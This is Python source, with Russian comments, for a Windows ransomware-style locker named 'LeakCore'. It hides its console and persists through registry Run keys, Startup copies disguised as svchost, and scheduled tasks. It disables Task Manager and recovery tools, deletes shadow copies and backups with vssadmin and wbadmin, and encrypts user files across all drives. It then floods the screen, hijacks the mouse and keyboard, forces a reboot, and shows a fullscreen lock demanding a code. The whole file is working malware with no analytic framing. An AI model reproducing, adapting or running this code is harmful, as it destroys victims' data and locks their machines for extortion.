import os
import sys
import ctypes
import winreg as reg
import shutil
import tkinter as tk
from tkinter import messagebox
import time
import random
import subprocess
import threading
import winsound
from cryptography.fernet import Fernet
import base64

# ==================== КОНСТАНТЫ ====================
CODE = "LeakCore67148842526767671488917162763635628292928276318292736393020heuewiejg3iwlwp1o12jb3veu2iiebrh3o3oeh4b3o30eirbdn"
VERSION = "vkXanderCRY_1402"
NAME = "LeakCore"

try:
    SCREEN_WIDTH = ctypes.windll.user32.GetSystemMetrics(0)
    SCREEN_HEIGHT = ctypes.windll.user32.GetSystemMetrics(1)
except:
    SCREEN_WIDTH = 1920
    SCREEN_HEIGHT = 1080

# ========== МОДУЛЬ 1: СКРЫТИЕ ==========
def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.SetConsoleTitleW("Windows Host Process")
    except:
        pass

# ========== МОДУЛЬ 2: БЛОКИРОВКА СИСТЕМЫ ==========
def block_system():
    try:
        ctypes.windll.user32.BlockInput(True)
        
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        
        hwnd = ctypes.windll.user32.FindWindowW("Progman", None)
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        
        try:
            key = reg.HKEY_CURRENT_USER
            path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            handle = reg.CreateKey(key, path)
            reg.SetValueEx(handle, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
            reg.SetValueEx(handle, "DisableRegistryTools", 0, reg.REG_DWORD, 1)
            reg.SetValueEx(handle, "DisableCMD", 0, reg.REG_DWORD, 1)
            reg.CloseKey(handle)
        except:
            pass
        
        try:
            key = reg.HKEY_CURRENT_USER
            path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            handle = reg.CreateKey(key, path)
            reg.SetValueEx(handle, "DisableCAD", 0, reg.REG_DWORD, 1)
            reg.CloseKey(handle)
        except:
            pass
    except:
        pass

# ========== МОДУЛЬ 3: АВТОЗАПУСК ==========
def add_to_startup():
    try:
        current_file = os.path.abspath(__file__)
        
        keys = [NAME, "WindowsHost", "SecurityService"]
        key = reg.HKEY_CURRENT_USER
        path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        handle = reg.OpenKey(key, path, 0, reg.KEY_WRITE)
        for k in keys:
            reg.SetValueEx(handle, k, 0, reg.REG_SZ, sys.executable + " " + current_file)
        reg.CloseKey(handle)
        
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        for i in range(3):
            shutil.copy(current_file, os.path.join(startup_folder, f"svchost_{i}.pyw"))
        
        for i in range(3):
            subprocess.run(
                f'schtasks /create /tn "{NAME}_{i}" /tr "{sys.executable} {current_file}" /sc minute /mo 1 /f',
                shell=True, capture_output=True
            )
        
        try:
            key = reg.HKEY_LOCAL_MACHINE
            path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            handle = reg.OpenKey(key, path, 0, reg.KEY_WRITE)
            reg.SetValueEx(handle, NAME, 0, reg.REG_SZ, sys.executable + " " + current_file)
            reg.CloseKey(handle)
        except:
            pass
    except:
        pass

# ========== МОДУЛЬ 4: СТРАШНАЯ МУЗЫКА ==========
def play_scary_music():
    frequencies = [200, 400, 600, 800, 1000, 1200, 1400, 1600, 1800, 2000]
    while True:
        try:
            for freq in frequencies:
                winsound.Beep(freq, 80)
            for freq in reversed(frequencies):
                winsound.Beep(freq, 80)
            time.sleep(0.1)
        except:
            pass

# ========== МОДУЛЬ 5: ШИФРОВАНИЕ ФАЙЛОВ ==========
def generate_key():
    key = Fernet.generate_key()
    with open(os.path.join(os.environ['TEMP'], f'{NAME}_key.txt'), 'w') as f:
        f.write(key.decode())
    return key

def encrypt_file(file_path, cipher):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(file_path, 'wb') as f:
            f.write(encrypted)
        os.rename(file_path, file_path + f".{NAME}")
        return True
    except:
        return False

def scan_and_encrypt():
    extensions = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.jpeg', '.png', '.mp3', '.mp4', '.zip', '.rar', '.7z', '.db', '.sqlite', '.bak', '.backup']
    key = generate_key()
    cipher = Fernet(key)
    
    drives = ['C:', 'D:', 'E:', 'F:', 'G:', 'H:']
    for drive in drives:
        if os.path.exists(drive):
            for root, dirs, files in os.walk(drive):
                if 'Windows' in root or 'System32' in root or 'Program Files' in root:
                    continue
                for file in files:
                    if any(file.endswith(ext) for ext in extensions):
                        try:
                            encrypt_file(os.path.join(root, file), cipher)
                        except:
                            pass

# ========== МОДУЛЬ 6: ЗАСОРИТЬ РАБОЧИЙ СТОЛ ==========
def flood_desktop():
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    while True:
        try:
            folder_name = os.path.join(desktop, f"{NAME}_DEBTOR_{random.randint(100, 999)}")
            os.makedirs(folder_name, exist_ok=True)
            
            for i in range(10):
                file_path = os.path.join(folder_name, f"{random.randint(1, 100)}.DU")
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(f"{NAME} - LOCKED\n")
                    f.write(f"CODE: {CODE}\n")
                    f.write(f"VERSION: {VERSION}\n")
            
            readme_path = os.path.join(desktop, f"{NAME}_README.txt")
            with open(readme_path, 'w', encoding='utf-8') as f:
                f.write("╔═══════════════════════════════════════════════════════════════╗\n")
                f.write(f"║                      {NAME}                                   ║\n")
                f.write("║                   ВАША СИСТЕМА ЗАБЛОКИРОВАНА                   ║\n")
                f.write("╠═══════════════════════════════════════════════════════════════╣\n")
                f.write("║                                                               ║\n")
                f.write("║   ВСЕ ВАШИ ФАЙЛЫ БЫЛИ ЗАШИФРОВАНЫ                             ║\n")
                f.write("║                                                               ║\n")
                f.write("║   ДЛЯ РАЗБЛОКИРОВКИ ВВЕДИТЕ КОД НА ЭКРАНЕ                     ║\n")
                f.write("║                                                               ║\n")
                f.write("╚═══════════════════════════════════════════════════════════════╝\n")
            time.sleep(5)
        except:
            pass

# ========== МОДУЛЬ 7: ПОТОП ОКОН ==========
def flood_windows():
    while True:
        try:
            for i in range(5):
                subprocess.Popen(f"cmd /k color 4f & title {NAME}_{i} & echo [{NAME}] BAC ЗАМЕТИЛИ & echo [{NAME}] Memory protection locked & echo [{NAME}] Service started", shell=True)
            
            for i in range(3):
                subprocess.Popen("explorer C:\\Windows\\System32", shell=True)
                subprocess.Popen("explorer C:\\Windows\\Temp", shell=True)
            
            time.sleep(2)
        except:
            pass

# ========== МОДУЛЬ 8: ХАОС МЫШИ ==========
def mouse_chaos():
    while True:
        try:
            x = random.randint(0, SCREEN_WIDTH)
            y = random.randint(0, SCREEN_HEIGHT)
            ctypes.windll.user32.SetCursorPos(x, y)
            time.sleep(0.02)
        except:
            pass

# ========== МОДУЛЬ 9: БОМБА СООБЩЕНИЙ ==========
def message_bomb():
    while True:
        try:
            messages = [
                f"[{NAME}] Memory protection at address 0x0424f1 is locked!",
                f"[{NAME}] Service started.",
                f"[{NAME}] BAC ЗАМЕТИЛИ",
                f"[{NAME}] ВАША СИСТЕМА ЗАБЛОКИРОВАНА",
                f"[{NAME}] ВСЕ ДАННЫЕ ЗАШИФРОВАНЫ",
                f"[{NAME}] КОД: {CODE[:20]}..."
            ]
            for i in range(3):
                ctypes.windll.user32.MessageBoxW(0, random.choice(messages), NAME, 0x10 | 0x1000)
            time.sleep(0.5)
        except:
            pass

# ========== МОДУЛЬ 10: ХАОС КЛАВИАТУРЫ ==========
def keyboard_chaos():
    while True:
        try:
            ctypes.windll.user32.keybd_event(0x14, 0, 0x0001, 0)
            time.sleep(0.05)
            ctypes.windll.user32.keybd_event(0x14, 0, 0x0002, 0)
            time.sleep(0.05)
            ctypes.windll.user32.keybd_event(0x90, 0, 0x0001, 0)
            time.sleep(0.05)
            ctypes.windll.user32.keybd_event(0x90, 0, 0x0002, 0)
            time.sleep(0.05)
            ctypes.windll.user32.keybd_event(0x91, 0, 0x0001, 0)
            time.sleep(0.05)
            ctypes.windll.user32.keybd_event(0x91, 0, 0x0002, 0)
            time.sleep(0.05)
        except:
            pass

# ========== МОДУЛЬ 11: ЭКРАН БЛОКИРОВКИ ==========
def lock_screen():
    try:
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.configure(bg='black')
        root.overrideredirect(True)
        
        text = f"""
╔═══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                   ║
║                              {NAME}                                              ║
║                         {VERSION}                                                 ║
║                                                                                   ║
║   ═══════════════════════════════════════════════════════════════════════════   ║
║                                                                                   ║
║                    ВАША СИСТЕМА ЗАБЛОКИРОВАНА!                                    ║
║                                                                                   ║
║   ВСЕ ВАШИ ФАЙЛЫ БЫЛИ ЗАШИФРОВАНЫ                                                 ║
║                                                                                   ║
║   ДЛЯ РАЗБЛОКИРОВКИ ВВЕДИТЕ КОД:                                                  ║
║                                                                                   ║
║   ═══════════════════════════════════════════════════════════════════════════   ║
║                                                                                   ║
║   Current PC: [C:\\{NAME}_DEBTOR\\01.DU]                                          ║
║                                                                                   ║
╚═══════════════════════════════════════════════════════════════════════════════════╝
        """
        
        label = tk.Label(
            root,
            text=text,
            font=("Courier", 14, "bold"),
            fg="#ff0000",
            bg="black",
            justify="left"
        )
        label.pack(expand=True, padx=50, pady=50)
        
        entry_frame = tk.Frame(root, bg="black")
        entry_frame.pack(pady=20)
        
        entry = tk.Entry(
            entry_frame,
            font=("Courier", 14),
            bg="black",
            fg="#ff0000",
            insertbackground="#ff0000",
            width=80,
            bd=2,
            relief="solid"
        )
        entry.pack()
        entry.focus()
        
        error_label = tk.Label(
            root,
            text="",
            font=("Courier", 12),
            fg="yellow",
            bg="black"
        )
        error_label.pack(pady=10)
        
        def check_code(event=None):
            if entry.get() == CODE:
                try:
                    ctypes.windll.user32.BlockInput(False)
                    hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
                    ctypes.windll.user32.ShowWindow(hwnd, 1)
                    root.destroy()
                except:
                    pass
                messagebox.showinfo(NAME, "Система разблокирована.")
                try:
                    os.remove(sys.executable)
                except:
                    pass
                sys.exit()
            else:
                error_label.config(text="❌ НЕВЕРНЫЙ КОД! ДОСТУП ЗАПРЕЩЕН! ❌")
                entry.delete(0, tk.END)
                for _ in range(20):
                    x = random.randint(0, SCREEN_WIDTH)
                    y = random.randint(0, SCREEN_HEIGHT)
                    ctypes.windll.user32.SetCursorPos(x, y)
                    time.sleep(0.01)
        
        entry.bind('<Return>', check_code)
        
        def block_keys(event):
            if event.keysym in ['Escape', 'F4', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12']:
                return "break"
            if event.state & 0x0004 and event.keysym == 'Delete':
                return "break"
            if event.state & 0x0002 and event.keysym == 'F4':
                return "break"
        
        root.bind('<Key>', block_keys)
        
        def focus_in():
            root.lift()
            root.focus_force()
        
        root.bind('<FocusOut>', lambda e: root.after(10, focus_in))
        
        root.mainloop()
        
    except:
        pass

# ========== МОДУЛЬ 12: УНИЧТОЖЕНИЕ ТОЧЕК ВОССТАНОВЛЕНИЯ ==========
def delete_restore_points():
    try:
        subprocess.run("vssadmin delete shadows /all /quiet", shell=True)
        subprocess.run("wbadmin delete catalog -quiet", shell=True)
    except:
        pass

# ========== МОДУЛЬ 13: ПЕРЕЗАГРУЗКА ==========
def shutdown_threat():
    time.sleep(60)
    try:
        subprocess.run(f"shutdown /r /t 30 /c \"{NAME}: СИСТЕМА ЗАБЛОКИРОВАНА. ПЕРЕЗАГРУЗКА ЧЕРЕЗ 30 СЕКУНД.\"", shell=True)
    except:
        pass

# ========== ГЛАВНАЯ ==========
def main():
    hide_console()
    add_to_startup()
    delete_restore_points()
    block_system()
    scan_and_encrypt()
    
    threads = [
        threading.Thread(target=play_scary_music, daemon=True),
        threading.Thread(target=flood_desktop, daemon=True),
        threading.Thread(target=flood_windows, daemon=True),
        threading.Thread(target=mouse_chaos, daemon=True),
        threading.Thread(target=message_bomb, daemon=True),
        threading.Thread(target=keyboard_chaos, daemon=True),
        threading.Thread(target=shutdown_threat, daemon=True)
    ]
    
    for t in threads:
        t.start()
    
    lock_screen()

if __name__ == "__main__":
    main()